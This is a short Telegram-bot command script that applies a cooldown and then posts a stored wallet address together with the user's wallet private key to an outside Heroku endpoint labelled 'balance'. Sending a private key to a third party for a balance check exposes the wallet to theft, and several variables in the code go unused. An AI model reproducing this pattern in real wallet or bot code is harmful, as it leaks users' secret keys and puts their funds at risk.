/*CMD
  command: refhyhvfjk
  help: 
  need_reply: 
  auto_retry_time: 
  folder: 
  answer: 
  keyboard: 
  aliases: 
CMD*/

function canRun(){
  var last_run_at = User.getProperty("last_run_at");
  if(!last_run_at){ return true }
  
  var minutes = (Date.now() - last_run_at) /1000/60;
  
 var minutes_in_day =  1 * 1
          var next = minutes_in_day - minutes
          var wait_hours = Math.floor(next / 60)
          next -= wait_hours * 60
          var wait_minutes = Math.floor(next)
          var seconds = Math.floor((next - wait_minutes) * 60)
          if (minutes < minutes_in_day) {
   Bot.sendMessage("");
   return
 }
  return true;
 }

if(!canRun()){ return }
User.setProperty("last_run_at", Date.now(), "integer");
var cbal = User.getProperty("cbal")
var rs = Libs.ResourcesLib.userRes("temp");
var wallpk = User.getProperty("wallpk")
var w = User.getProperty("wallset")
HTTP.post( {
    url: "https://tronb.herokuapp.com/balance",
    success: 'ridjbssjsb',
    body: {'address':w,'private_key': wallpk}

})
